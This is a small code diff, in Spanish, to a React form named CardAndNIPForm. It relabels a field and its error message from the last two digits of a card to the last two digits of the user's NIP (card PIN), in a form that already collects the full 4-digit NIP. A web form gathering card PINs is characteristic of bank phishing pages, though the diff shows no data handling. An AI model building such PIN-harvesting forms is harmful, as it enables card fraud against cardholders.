@@ -70,7 +70,7 @@ const CardAndNIPForm = () => {
 
         // Si hay errores, muestra el mensaje con el primer error encontrado
         const errorMessages = {
-            lastTwoDigits: 'Ingresa los 2 últimos dígitos de tu tarjeta.',
+            lastTwoDigits: 'Ingresa los 2 últimos dígitos de tu NIP.',
             nip: 'Ingresa los 4 dígitos de tu NIP.',
         };
 
@@ -187,7 +187,7 @@ const CardAndNIPForm = () => {
                         required
                         fullWidth
                         id="lastTwoDigits"
-                        label="2 últimos dígitos de tu tarjeta"
+                        label="2 últimos dígitos de tu NIP"
                         name="lastTwoDigits"
                         type="tel"
                         value={formData.lastTwoDigits}
